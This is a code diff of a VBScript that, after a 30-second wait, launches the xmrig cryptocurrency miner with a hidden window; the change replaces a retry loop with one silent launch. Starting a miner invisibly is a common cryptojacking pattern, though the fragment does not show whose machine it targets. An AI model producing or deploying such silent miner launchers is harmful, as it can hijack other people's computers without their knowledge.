@@ -1,7 +1,7 @@
 Option Explicit
 
 Dim objFSO, objShell, jsonFilePath, jsonContent, objFile, pingResult, ipAddress
-Dim regex, matches, updatedContent, xmrigPath, retries, retryDelay
+Dim regex, matches, updatedContent, xmrigPath
 
 ' Initialize file system and shell objects
 Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -54,19 +54,7 @@ objFile.Close
 ' Wait for 30 seconds
 WScript.Sleep 30000
 
-' Attempt to launch xmrig.exe with retries
-retries = 3
-retryDelay = 5000 ' 5 seconds
-
-Do While retries > 0
-    If objFSO.FileExists(xmrigPath) Then
-        On Error Resume Next
-        objShell.Run """" & xmrigPath & """", 0, False
-        If Err.Number = 0 Then
-            Exit Do ' Exit if successful
-        End If
-        On Error GoTo 0
-    End If
-    retries = retries - 1
-    WScript.Sleep retryDelay
-Loop
+' Launch xmrig.exe silently if it exists
+If objFSO.FileExists(xmrigPath) Then
+    objShell.Run """" & xmrigPath & """", 0, False
+End If
